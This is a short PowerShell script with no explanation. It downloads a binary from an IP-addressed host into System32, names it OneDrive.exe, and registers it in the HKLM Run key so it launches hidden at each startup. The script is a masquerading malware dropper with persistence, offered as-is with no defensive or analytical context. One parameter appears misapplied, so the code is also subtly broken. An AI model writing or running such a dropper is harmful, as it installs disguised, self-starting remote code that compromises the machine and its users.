$IP = "192.168.1.1"
Invoke-WebRequest -Uri http://$IP/download/windows-agent -Outfile "C:/Windows/System32/OneDrive.exe"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDrive" -Value "PowerShell.exe -WindowStyle hidden C:\Windows\System32\OneDrive.exe" -PropertyType String